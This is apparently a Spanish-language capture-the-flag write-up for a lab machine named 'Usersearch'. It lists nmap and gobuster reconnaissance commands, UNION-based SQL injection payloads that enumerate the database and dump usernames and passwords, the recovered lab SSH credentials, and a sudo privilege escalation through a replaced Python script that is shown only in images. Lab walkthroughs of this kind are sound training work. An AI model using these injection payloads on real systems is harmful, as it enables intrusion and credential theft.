# Máquina Usersearch

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.18.0.2

![alt text](image.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.18.0.2

![alt text](image-1.png)

### Fuzzing Web

gobuster dir -t 200 -u http://172.18.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -b 403,404 2>/dev/null

![alt text](image-2.png)

No se econtró nada

### SQLinjection

Interceptamos la petición con Burpsuite y la enviamos al repeater

ver nombre de la base de datos:

' union select 1,2,database()-- -

![alt text](image-3.png)

Ver tablas dentro de la base de datos

' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='testdb')-- -

![alt text](image-4.png)

ver las columnas dentro de la tabla users

' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema = 'testdb' and table_name='users')-- -

![alt text](image-5.png)

ver 1 por 1 registro de la tabla users en los campos username, password

' union select 1,2,(select concat_ws('-', username,password) from users limit 0,1)-- -

![alt text](image-6.png)

![alt text](image-7.png)

![alt text](image-8.png)

### Intrusión

Me conecté por ssh con las credenciales:

kvzlx-kvzlxpassword

hice sudo -l

![alt text](image-9.png)

cambié el nombre del archivo system_info.py por hola.py y creé un archivo system_info.py con el siguiente contenido: 

![alt text](image-10.png)

y luego ejecuté

![alt text](image-11.png)